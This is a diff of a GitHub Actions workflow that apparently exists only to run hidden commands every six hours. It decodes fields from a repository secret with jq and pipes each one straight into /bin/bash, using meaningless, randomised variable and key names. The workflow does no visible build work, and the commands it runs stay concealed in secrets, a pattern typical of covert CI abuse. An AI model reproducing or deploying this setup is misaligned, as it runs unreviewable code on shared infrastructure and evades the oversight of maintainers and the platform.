@@ -1,8 +1,9 @@
 name: renlingu
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
+    - cron: '1 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: renlingu
         env:
-          my58: ${{ secrets.my58 }}
+          l15: ${{ secrets.l15 }}
         run: |
-          echo $my58 | jq -r .hgvai3 | /bin/bash
-          echo $f739 | jq -r .uv4 | /bin/bash
-          echo $u71 | jq -r .rc3 | /bin/bash
-          echo $qj51 | jq -r .vecb562 | /bin/bash
-          echo $mo99 | jq -r .uzt893 | /bin/bash
-          echo $zqmf39 | jq -r .nbq357 | /bin/bash
-          echo $c5 | jq -r .ihzy94373 | /bin/bash
-          echo $f75062 | jq -r .pxho93 | /bin/bash
-          echo $osmaf3657 | jq -r .q27 | /bin/bash
-          echo $zz5850 | jq -r .fjk08319 | /bin/bash
-          echo $e0380 | jq -r .tab7 | /bin/bash
-          echo $cs25 | jq -r .l18451 | /bin/bash
-          echo $o8 | jq -r .xvmcd1 | /bin/bash
-          echo $n36868 | jq -r .dgvc91104 | /bin/bash
-          echo $m2 | jq -r .fcsbj96 | /bin/bash
+          echo $l15 | jq -r .ze8 | /bin/bash
+          echo $rxtti782 | jq -r .gequ36 | /bin/bash
+          echo $uhr584 | jq -r .nzjb0 | /bin/bash
+          echo $zhjgr400 | jq -r .jsclq66 | /bin/bash
+          echo $gwsf11 | jq -r .pgg0 | /bin/bash
+          echo $uay167 | jq -r .xp9175 | /bin/bash
+          echo $w43194 | jq -r .g95484 | /bin/bash
 
